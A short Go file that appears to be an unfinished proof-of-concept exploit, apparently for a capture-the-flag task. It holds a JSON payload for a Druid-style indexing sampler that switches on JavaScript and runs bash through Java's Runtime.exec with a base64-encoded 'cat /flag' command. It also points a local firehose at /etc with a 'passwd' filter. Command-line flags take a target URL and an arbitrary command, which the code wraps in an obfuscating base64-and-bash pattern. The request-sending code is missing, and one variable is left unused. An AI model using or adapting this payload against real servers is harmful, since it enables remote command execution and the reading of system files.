package main

import "flag"

var poc = `{
    "type":"index",
    "spec":{
        "ioConfig":{
            "type":"index",
            "firehose":{
                "type":"local",
                "baseDir":"/etc",
                "filter":"passwd"
            }
        },
        "dataSchema":{
            "dataSource":"test",
            "parser":{
                "parseSpec":{
                "format":"javascript",
                "timestampSpec":{

                },
                "dimensionsSpec":{

                },
                "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"bash\",\"-c\",\"{echo,Y2F0IC9mbGFn}|{base64,-d}|{bash,-i}\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
                "":{
                    "enabled":"true"
                }
                }
            }
        }
    },
    "samplerConfig":{
        "numRows":10
    }
}`

func main() {
	url := flag.String("u", "http://127.0.0.1:8888/", "Target URL")
	cmd := flag.String("c", "", "Command to execute")
	useB64 := flag.Bool("b64", false, "Use base64 encoding")
	flag.Parse()
	if *cmd == "" || *url == "" {
		flag.Usage()
		return
	}
	var finalCmd string
	if *useB64 {
		*cmd = "{echo," + *cmd + "}|{base64,-d}|{bash,-i}"
	} else {
		*cmd = "bash -c " + *cmd
	}

}
